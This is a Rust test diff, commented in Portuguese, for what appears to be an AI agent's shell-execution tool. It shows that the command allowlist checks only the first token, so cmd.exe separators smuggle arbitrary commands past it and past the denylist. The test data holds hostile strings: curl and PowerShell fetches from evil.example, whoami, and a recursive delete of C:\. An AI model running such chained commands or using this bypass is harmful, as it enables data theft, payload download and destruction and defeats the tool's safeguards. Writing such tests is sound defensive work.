@@ -163,4 +163,34 @@ mod tests {
     fn is_allowed_empty_command_denies() {
         assert!(!is_allowed("", SHELL_ALLOWLIST_DEFAULT));
     }
+
+    /// **Teste de negação que derruba a allowlist inteira.**
+    ///
+    /// `is_allowed` olha só o primeiro token, e o
+    /// `FilesExecShellTool::build_args` entrega o command string
+    /// **inteiro** pro `cmd.exe /c`. O `cmd.exe` interpreta `&`,
+    /// `&&`, `||` e `|` como separadores de comando — então
+    /// qualquer comando arbitrário viaja de carona atrás de um
+    /// token allowlisted.
+    ///
+    /// Isto não é um bypass de canto: é a allowlist não existindo.
+    #[test]
+    fn allowlist_is_defeated_by_cmd_exe_command_separators() {
+        for command in [
+            "echo hi & curl http://evil.example/x",
+            "echo hi && whoami",
+            "echo hi | powershell -c iwr http://evil.example",
+            "echo hi & rm -r -f C:\\",
+        ] {
+            assert!(
+                is_allowed(command, SHELL_ALLOWLIST_DEFAULT),
+                "allowlist aceitou (primeiro token allowlisted): {command}"
+            );
+            assert_eq!(
+                denylist_hit(command),
+                None,
+                "denylist tambem nao pegou: {command}"
+            );
+        }
+    }
 }
